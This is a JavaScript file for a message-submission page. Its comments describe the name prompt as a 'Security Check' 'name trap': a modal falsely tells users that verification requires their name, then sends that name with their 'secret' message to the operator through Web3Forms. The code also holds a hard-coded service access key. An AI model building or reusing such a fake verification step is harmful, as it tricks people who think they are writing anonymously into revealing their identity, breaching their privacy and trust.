// Your Web3Forms Access Key
const ACCESS_KEY = "95b7652e-f0bf-49b5-9b40-f20119bad137";

// 1. Opens the 'Security Check' name trap
function openVerification() {
    const msg = document.getElementById('userMessage').value;
    if (msg.trim() === "") {
        alert("Please write a message first!");
        return;
    }
    document.getElementById('trapModal').style.display = 'flex';
}

// 2. Sends the data and switches to the 'Success' popup
async function submitData() {
    const msg = document.getElementById('userMessage').value;
    const name = document.getElementById('senderName').value;

    if (!name) {
        alert("Verification required: Please enter your name.");
        return;
    }

    const btn = document.querySelector("#trapModal button");
    btn.innerText = "Sending...";
    btn.disabled = true;

    try {
        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                access_key: ACCESS_KEY,
                from_name: name, // Captures their real name
                message: msg,
                subject: `NEW SECRET FROM: ${name}`
            })
        });

        if (response.ok) {
            // HIDE the name input popup
            document.getElementById('trapModal').style.display = 'none';
            // SHOW the green success popup
            document.getElementById('successModal').style.display = 'flex';
        } else {
            alert("Error sending message. Try again.");
            btn.innerText = "Verify & Send";
            btn.disabled = false;
        }
    } catch (e) {
        console.error(e);
        alert("Connection error.");
        btn.innerText = "Verify & Send";
        btn.disabled = false;
    }
}

// 3. Closes the success popup and resets the page
function closeSuccess() {
    location.reload(); 
}

// Close modals if clicking outside the box
window.onclick = function(event) {
    if (event.target.className === 'modal') {
        event.target.style.display = "none";
    }
}